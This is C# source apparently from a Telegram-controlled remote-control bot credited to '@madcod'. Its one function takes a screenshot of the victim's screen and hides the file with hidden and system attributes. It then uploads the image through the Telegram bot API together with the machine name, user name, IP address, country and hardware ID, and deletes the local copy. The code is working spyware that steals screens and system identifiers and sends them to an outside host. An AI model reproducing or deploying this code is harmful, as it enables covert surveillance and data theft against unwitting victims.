/////////////////////////////////////////////////////////
///////////////////By Telegram: @madcod//////////////////
/////////////////////////////////////////////////////////

using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace TGControlBot
{
    class Functions
    {
        public static void ScreenSend()
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(Help.MyDocuments + "\\Screen" + ".Jpeg", ImageFormat.Jpeg);
                File.SetAttributes(Help.MyDocuments + "\\Screen" + ".Jpeg", FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);


                Thread.Sleep(new Random(Environment.TickCount).Next(1000, 3000));

                string LOG = @"" + Help.MyDocuments + "\\Screen" + ".Jpeg";
                byte[] file = File.ReadAllBytes(LOG);
                string url = string.Concat(new string[]
                {
                    Help.ApiUrl,
                    Program.token,
                    "/sendDocument?chat_id=",
                    Program.id,
                    "&caption=📅 " + Help.date +
                    "\n👤 " + Environment.MachineName + "/" + Environment.UserName +
                    "\n🏴 IP: " +Help.IP+ Help.Country() +
                    "\n🆔 HWID: " + Help.HWID

                });
                SenderAPI.POST(file, LOG, "application/x-ms-dos-executable", url);
                File.Delete(Help.MyDocuments + "\\Screen" + ".Jpeg");
            }
            catch { }
        }
    }
}
